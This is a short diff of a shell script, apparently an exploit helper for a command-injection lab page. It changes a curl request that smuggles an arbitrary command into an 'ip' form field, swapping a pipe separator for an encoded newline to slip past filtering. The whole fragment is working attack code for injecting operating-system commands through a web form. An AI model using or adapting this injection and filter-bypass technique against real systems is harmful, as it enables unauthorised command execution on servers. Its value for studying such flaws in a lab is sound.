@@ -43,7 +43,7 @@ inject_cmd() {
   local cmd="$1"
   curl -s "$URL" \
     -H "Cookie: $COOKIE" \
-    --data-urlencode "ip=127.0.0.1 | $cmd" \
+    --data-urlencode "127.0.0.1%0a$cmd" \
     --data "Submit=Submit" > /dev/null
 }
 
